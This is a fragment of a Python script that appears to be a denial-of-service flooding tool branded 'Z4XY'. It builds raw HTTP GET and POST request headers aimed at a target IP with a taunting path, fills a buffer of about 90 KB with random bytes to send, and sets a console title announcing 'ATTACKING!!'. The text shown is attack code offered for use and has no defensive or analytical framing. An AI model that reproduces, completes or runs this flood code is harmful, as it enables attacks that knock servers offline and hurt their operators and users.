...
def Headers(method):
    ...
    if method == "get" or method == "head":
        post_host = "POST /Your_Server_Bypassed_By_Z4XY HTTP/1.1\r\nHost: " + ip + "\r\n"
...
os.system('color ' +random.choice(['D'])+ " & cls & title Z4XY [ ATTACKING!!]")
def get():
    header = Headers("get")
    i = random.choice(("[*]","[!]","[#]"))
    data = random._urandom(90048)
    if choice == "1":
        get_host = "GET /Your_Server_Bypassed_By_Z4XY HTTP/1.1\r\nHost: " + ip + "\r\n"
